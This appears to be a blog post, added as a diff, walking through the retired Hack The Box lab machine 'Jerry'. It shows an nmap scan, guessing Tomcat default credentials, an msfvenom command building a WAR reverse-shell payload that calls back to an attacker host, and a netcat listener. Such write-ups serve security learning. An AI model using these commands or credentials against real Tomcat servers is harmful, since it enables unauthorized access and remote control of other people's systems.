@@ -1,0 +1,85 @@
+---
+layout: post
+title: Hack The Box - Jerry
+permalink : /HackTheBox-Jerry/
+image: /hackthebox/jerry/0.jpg
+---
+
+<hr>
+#### Jerry has retired and this is my write-up about it...
+<br>
+#### Jerry was one of the easiest boxes on HTB. It was a beginner-box . 
+#### It's a windows box and its ip is 10.10.10.95
+![](/images/hackthebox/jerry/0.jpg)
+<hr>
+<br>
+#### Starting with nmap to scan for tcp ports and services :
+`nmap -sV -sT 10.10.10.95`
+![](/images/hackthebox/jerry/1.jpg)
+<hr>
+<br>
+#### We can see that the port 8080 is open and running http and the server is Apache Tomcat.
+#### By visiting it in the browser we get the default tomcat configuration page.
+![](/images/hackthebox/jerry/2.png)
+<hr>
+<br>
+#### There's a manager app so let's try to access it .
+![](/images/hackthebox/jerry/3.png)
+<hr>
+<br>
+#### It asks for authentication and common passwords like those mentioned below didn't work:
+*tomcat:tomcat* <br>
+*admin:admin* <br>
+*admin:password* <br>
+*user:password* <br>
+#### So by closing the login panel it causes an error because we are not authorized to view the manager page
+#### But by looking at the error page :
+![](/images/hackthebox/jerry/4.png)
+<hr>
+<br>
+#### It shows these credentials :
+*tomcat:s3cret*
+#### This seems to be a part of the documentation and those credentials are dafault credentials.
+#### Will they work ? yup !
+![](/images/hackthebox/jerry/5.png)
+![](/images/hackthebox/jerry/6.png)
+<hr>
+<br>
+## Exploitation
+#### Now we are logged in to the manager app and we can get a shell from here
+<br>
+#### We are on an apache tomcat server and apache tomcat uses WAR files.
+#### To get a reverse shell we will use msfvenom to create the payload :
+<br>
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4449 -f war > backdoor.war`
+![](/images/hackthebox/jerry/7.jpg)
+<br>
+#### Then we will upload our payload to the server.
+![](/images/hackthebox/jerry/8.jpg)
+![](/images/hackthebox/jerry/9.jpg)
+<br>
+#### Then we will listen to the port with netcat :
+<br>
+`nc -lvnp 4449`
+<hr>
+<br>
+#### Now we got a reverse shell as admin so there's no need for previlege escalation.
+
+![](/images/hackthebox/jerry/10.jpg)
+<br>
+<br>
+![](/images/hackthebox/jerry/11.jpg)
+<br>
+<br>
+![](/images/hackthebox/jerry/12.jpg)
+<br>
+<hr>
+#### Another way to do this is to use this tool written by **mgeeky** [TomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) to automate the process of getting a shell
+![](/images/hackthebox/jerry/13.jpg)
+<br>
+#### And that was Jerry . 
+#### Feedback is appreciated :D
+<br>
+#### Thanks for reading .
+<br>
+<hr>
